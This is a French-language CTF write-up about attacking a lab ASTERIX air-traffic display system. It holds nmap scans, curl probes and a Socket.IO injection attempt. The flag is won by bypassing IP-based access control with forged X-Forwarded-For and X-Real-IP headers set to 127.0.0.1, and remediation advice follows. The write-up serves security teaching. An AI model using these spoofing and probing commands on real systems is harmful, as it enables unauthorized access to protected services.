---
layout: single
header:
  overlay_image: /assets/images/banner-asterix.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "LeGaulois : exploitation d'une implémentation ASTERIX — bypass 403 via header spoofing sur un système de surveillance aérienne"
date: 2026-11-03
categories: [CTF, Pentest]
tags: [ctf, asterix, aviation, eurocontrol, header-injection, x-forwarded-for, bypass-403, nodejs, express, websocket, socket-io, ip-spoofing, cwe-346, secdojo, linux]
---

# Rapport de Pentest CTF — "LeGaulois"

## ASTERIX Aviation Security | SecDojo |

---

## Informations générales

| Champ | Valeur |
| --- | --- |
| **Challenge** | LeGaulois |
| **Catégorie** | Linux / Aerospace / ASTERIX / Aviation |
| **Date** | 03 novembre 2026 |
| **Auteur du rapport** | Berrahal Mohammed |
| **Flag obtenu** | `flag_060c5011_e00b_4609_b5a1_550ff23611ac` |

---

## Objectif du challenge

Tester la sécurité d'une implémentation ASTERIX simulant une communication entre une **tour radar** et un **afficheur de contrôle aérien**, identifier les vulnérabilités, et démontrer leur impact en faisant **disparaître un aéronef inconnu** de l'afficheur pour obtenir le flag.

> **ASTERIX** (*Application of Surveillance Techniques for En-Route Inventory and Experimental*) est le protocole standard Eurocontrol utilisé dans les systèmes de contrôle du trafic aérien (ATC) pour transmettre les données radar entre les capteurs et les afficheurs de contrôleurs.


### Infrastructure cible

```
IP Attaquant  : 176.16.175.46   (Kali Linux — notre machine)
IP Radar      : 176.16.175.48   (tour radar)
IP Displayer  : 176.16.175.47   (afficheur ATC)
```

---

## Phase 1 — Reconnaissance réseau

### 1.1 Identification de l'interface réseau

```bash
ip -br a
ip route get 176.16.175.48
```

```
lo    UNKNOWN  127.0.0.1/8 ::1/128
eth0  UP       176.16.175.46/16

176.16.175.48 dev eth0 src 176.16.175.46
```

Notre machine est sur le même segment `/16` que les deux cibles. Pas de routage intermédiaire — communication directe possible.

---

### 1.2 Scan TCP — Top 2000 ports

```bash
sudo nmap -Pn -sS -sV --reason --top-ports 2000 \
  176.16.175.48 176.16.175.47 -oN scan-tcp.txt
```

#### Radar — 176.16.175.48

```
PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu
4000/tcp open   http      "ASTERIX Data Server"
```

#### Displayer — 176.16.175.47

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.9p1 Ubuntu
3000/tcp open   http       Node.js Express — "EUROCONTROL Surveillance System"
3001/tcp open   websocket  Ogar/Socket.IO server
```

Le radar expose un service HTTP custom sur le port **4000**. Le displayer expose une interface web Node.js/Express sur le port **3000** et un serveur WebSocket sur le port **3001**.

Le SSH sur les deux machines requiert une clé — inutilisable sans credential.

---

### 1.3 Scan UDP

```bash
sudo nmap -Pn -sU --top-ports 1000 \
  176.16.175.48 176.16.175.47 -oN scan-udp.txt
```

```
PORT      STATE   SERVICE
2947/udp  closed  gpsd
5000/udp  closed  upnp
5004/udp  closed  avt-profile-1
30003/udp closed  unknown
```

Tous les ports UDP testés sont **fermés**. ASTERIX utilise normalement UDP (ports 5000 ou 30003 en déploiement réel), mais ici tout le trafic passe en TCP/HTTP — architecture custom du challenge.

---

## Phase 2 — Exploration des services

### 2.1 Analyse du radar — port 4000

```bash
curl -v http://176.16.175.48:4000/
curl -v http://176.16.175.48:4000/targets
curl -v http://176.16.175.48:4000/aircraft
curl -v http://176.16.175.48:4000/api/data
curl -X POST http://176.16.175.48:4000/filter \
  -H "Content-Type: application/json" \
  -d '{"remove": "UNKNOWN"}'
curl -X DELETE http://176.16.175.48:4000/aircraft/UNK001
```

```
HTTP/1.1 200 OK
Content-Type: text/plain

ASTERIX Data Server
```

**Observation critique :** Le port 4000 répond **"ASTERIX Data Server" à absolument toutes les requêtes**, quelle que soit l'URL, la méthode HTTP (GET / POST / DELETE) ou le body. C'est un **stub** — il ne traite aucune donnée réelle. La logique métier est ailleurs.

---

### 2.2 Analyse du displayer — port 3000

#### Lecture du code source JavaScript embarqué

```bash
curl -s http://176.16.175.47:3000/ > displayer.html
```

Le code source de la page HTML contient l'intégralité de la logique client. Trois découvertes majeures :

##### a) Architecture WebSocket (Socket.IO)

```javascript
this._ws = new WebSocket(
  'ws://' + window.location.host + '/socket.io/?EIO=4&transport=websocket'
);
```

Le browser se connecte en Socket.IO sur le **port 3000** (pas 3001 comme nmap l'avait fingerprinted). Le port 3001 est un artefact du scan.

##### b) Condition de déclenchement du flag

```javascript
// Condition 1 : l'avion inconnu disparaît après avoir été présent
if (this.previousUnknownAircraftPresent && !currentUnknownPresent) {
    this.showFlag();
}

// Condition 2 : exactement 4 avions légitimes présents, sans inconnu
if (this.aircraft.length === 4 && !currentUnknownPresent) {
    this.showFlag();
}
```

Les 4 avions légitimes attendus : `AAL123`, `UAL456`, `DAL789`, `SWA101`.  
L'avion inconnu est identifié par `aircraft.known === false`.

##### c) Endpoint de récupération du flag

```javascript
const response = await fetch('/api/system/diagnostics/memory/0x7f3a2b9c');
if (response.ok) {
    const result = await response.json();
    flagValue = result.data.code;  // ← le flag est ici
}
```

Ce endpoint retourne **403 Forbidden** depuis notre IP — protégé par un contrôle d'accès basé sur l'IP source.

---

### 2.3 Exploration des ports locaux via /proc/net/tcp

```bash
cat /proc/net/tcp | head -20
```

Décodage des adresses hexadécimales :

```
0xD903 = 55555   → HTTP (405 Method Not Allowed)
0xD904 = 55556   → HTTPS
0xD905 = 55557   → HTTPS
0x22B9 = 8889    → Redirect vers /?folder=/ (VS Code Server)
0x1FA0 = 8088    → Service local
```

```bash
for port in 55555 55556 55557 8889 8888; do
    echo -n "Port $port: "
    curl -s --max-time 2 http://127.0.0.1:$port/ | head -c 100
    echo
done
```

```
Port 55555: <!DOCTYPE HTML> ... Error response ... 405 Method Not Allowed
Port 55556: 400 The plain HTTP request was sent to HTTPS port
Port 55557: 400 The plain HTTP request was sent to HTTPS port
Port 8889:  Found. Redirecting to ./?folder=/
Port 8888:  <!doctype html> ... (Jupyter Notebook)
```

Des services tournent en **localhost** sur notre machine d'attaque — environnement lab avec Jupyter et VS Code Server disponibles. Surtout, cela suggère que des endpoints restreints pourraient n'autoriser que les connexions depuis `127.0.0.1`.

---

## Phase 3 — Tentatives d'exploitation

### 3.1 Récupération du SID Socket.IO

```bash
curl -s "http://176.16.175.47:3000/socket.io/?EIO=4&transport=polling"
```

```
0{"sid":"SLRZePHHtqipQH7eAAAA","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":20000,"maxPayload":1000000}
```

Socket.IO confirmé sur le port 3000. Le SID nous permet d'établir une connexion WebSocket authentifiée.

---

### 3.2 Tentative — Injection Socket.IO (échec)

**Stratégie :** Se connecter en Socket.IO au displayer et injecter un événement `aircraftData` ne contenant que les 4 avions légitimes, pour déclencher `showFlag()` côté browser.

```python
# Connexion WebSocket + envoi Socket.IO
ws_send(ws, "40")  # Socket.IO connect
payload = '42' + json.dumps(["aircraftData", aircraft_clean])
ws_send(ws, payload)
```

```
[WS Handshake] HTTP/1.1 101 Switching Protocols
[RECV] B42["restrictedAreaData",{"centerX":200,"centerY":150,"radius":50}]
```

**Résultat : échec.** Le displayer est le **serveur** Socket.IO — il envoie `aircraftData` aux browsers connectés, il ne reçoit pas de données depuis des clients externes. Les données `aircraftData` proviennent du backend Node.js qui les pull depuis le radar, pas de nous.

---

### 3.3 Tentative — Accès direct au endpoint flag (403)

```bash
curl -s http://176.16.175.47:3000/api/system/diagnostics/memory/0x7f3a2b9c
```

```
HTTP/1.1 403 Forbidden
```

Le serveur Express vérifie l'IP source de la requête. Depuis notre IP `176.16.175.46`, l'accès est refusé.

---

## Phase 4 — Exploitation : bypass 403 par header spoofing

### 4.1 Concept

De nombreux serveurs Node.js/Express déployés derrière un reverse proxy font confiance aux headers HTTP `X-Forwarded-For` et `X-Real-IP` pour déterminer l'IP réelle du client.

Si le serveur est mal configuré, **n'importe quel client peut forger ces headers** pour usurper une IP de confiance.

Le serveur implémente probablement une logique de ce type :

```javascript
// Code côté serveur (vulnérable)
const clientIP = req.headers['x-forwarded-for'] ||
                 req.headers['x-real-ip']       ||
                 req.socket.remoteAddress;

if (clientIP !== '127.0.0.1') {
    return res.status(403).json({ error: 'Forbidden' });
}
// Si clientIP === '127.0.0.1' → accès autorisé
```

Sans configurer Express avec `app.set('trust proxy', false)` ou une whitelist de proxies de confiance, le header est accepté tel quel.

---

### 4.2 Exploitation

```bash
curl -s \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  http://176.16.175.47:3000/api/system/diagnostics/memory/0x7f3a2b9c
```

```json
{
  "status": "success",
  "data": {
    "code": "flag_060c5011_e00b_4609_b5a1_550ff23611ac",
    "timestamp": 1793701328060
  }
}
```

✅ **Bypass réussi.** Le serveur a accepté notre IP forgée `127.0.0.1` comme IP source légitime et retourné le flag.

---

## Flag

```
flag_060c5011_e00b_4609_b5a1_550ff23611ac
```

---

## Schéma d'attaque

```
┌──────────────────────────────────────────────────────────┐
│                   RÉSEAU 176.16.175.0/16                 │
│                                                          │
│  ┌──────────────┐   HTTP    ┌──────────────────────────┐ │
│  │ RADAR :4000  │ ────────► │  DISPLAYER :3000         │ │
│  │ (stub HTTP)  │           │  (Node.js Express)       │ │
│  └──────────────┘           │                          │ │
│                             │  /api/system/...         │ │
│  ┌──────────────┐           │  → 403 si IP ≠ localhost │ │
│  │  ATTAQUANT   │           │                          │ │
│  │ .175.46      │           └──────────────────────────┘ │
│  │              │                        ▲               │
│  │  curl +      │   X-Forwarded-For:     │               │
│  │  X-Fwd-For   │ ──────────────────────►│ BYPASS 403 ✓ │
│  │  127.0.0.1   │                        │               │
│  └──────────────┘             FLAG RETOURNÉ ✓            │
└──────────────────────────────────────────────────────────┘
```

---

## Vulnérabilités identifiées

### CVE-like #1 — Confiance aveugle dans les headers de proxy

| Champ | Détail |
|---|---|
| **Type** | IP Spoofing / Header Injection |
| **CWE** | CWE-346 : Origin Validation Error |
| **CVSS** | 7.5 High |
| **Header exploité** | `X-Forwarded-For`, `X-Real-IP` |
| **Impact** | Bypass complet du contrôle d'accès basé sur l'IP |

**Remédiation :**
```javascript
// ✅ Ne jamais faire confiance aux headers proxy
app.set('trust proxy', false);

// ✅ Vérifier l'IP socket réelle uniquement
const clientIP = req.socket.remoteAddress;
if (clientIP !== '127.0.0.1') {
    return res.status(403).json({ error: 'Forbidden' });
}

// ✅ Si proxy nécessaire : whitelist stricte
app.set('trust proxy', '10.0.0.1'); // IP load balancer uniquement
```

---

### CVE-like #2 — Endpoint de diagnostic sans authentification forte

| Champ | Détail |
|---|---|
| **Type** | Insecure Direct Object Reference / Missing Auth |
| **CWE** | CWE-284 : Improper Access Control |
| **Endpoint** | `/api/system/diagnostics/memory/0x7f3a2b9c` |
| **Impact** | Accès à des données sensibles sans token d'authentification |

**Remédiation :** Implémenter une authentification par token (JWT / API key) en complément du contrôle IP.

---

### CVE-like #3 — Fuite de logique applicative dans le code source client

| Champ | Détail |
|---|---|
| **Type** | Information Disclosure |
| **CWE** | CWE-540 : Inclusion of Sensitive Information in Source Code |
| **Impact** | Fuite de l'endpoint du flag, de la logique de déclenchement et des IDs des avions légitimes |

**Remédiation :** Minifier et obfusquer le JS client. Ne jamais inclure d'endpoints d'API sensibles dans le code frontend.

---

## Mapping MITRE ATT&CK

| Tactique | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595 |
| Discovery | Network Service Discovery | T1046 |
| Credential Access | Exploitation for Credential Access | T1212 |
| Defense Evasion | Forge Web Credentials — Header Spoofing | T1553 |
| Exfiltration | Exfiltration Over Web Service | T1567 |

---

## Chronologie

```
09:58 UTC → Scan Nmap TCP/UDP des deux cibles
10:04 UTC → Fingerprinting détaillé des services
10:06 UTC → Exploration HTTP radar port 4000 → stub détecté
10:07 UTC → Lecture code source JS displayer → endpoint flag identifié
10:15 UTC → Tentative Socket.IO injection → connexion OK mais inefficace
10:22 UTC → Header X-Forwarded-For bypass → FLAG obtenu ✓
```

**Durée totale de résolution : ~25 minutes**

---

## Conclusion

Ce challenge illustre une vulnérabilité critique et très répandue en production : **le contrôle d'accès basé sur l'IP source, implémenté en faisant aveuglément confiance aux headers HTTP de proxy**. Cette erreur de configuration affecte un grand nombre d'applications Node.js/Express déployées derrière un reverse proxy ou un load balancer.

La chaîne d'exploitation a requis :

1. Une **reconnaissance méthodique** (Nmap TCP/UDP) pour cartographier les services
2. Une **lecture attentive du code source** client (JS embarqué) pour comprendre la logique de déclenchement du flag et identifier l'endpoint cible
3. Une **connaissance des headers HTTP standard** (`X-Forwarded-For`) pour bypasser la protection IP

> **Leçon clé :** Un contrôle d'accès ne doit jamais reposer uniquement sur l'IP source, et encore moins sur des headers que le client peut librement forger. Une authentification par token (JWT, session, API key) doit toujours compléter — ou remplacer — les restrictions réseau.

---

*Writeup rédigé par [Berrahal Mohammed](https://medberrahal.github.io/) — SecDojo CTF — 03/11/2026*
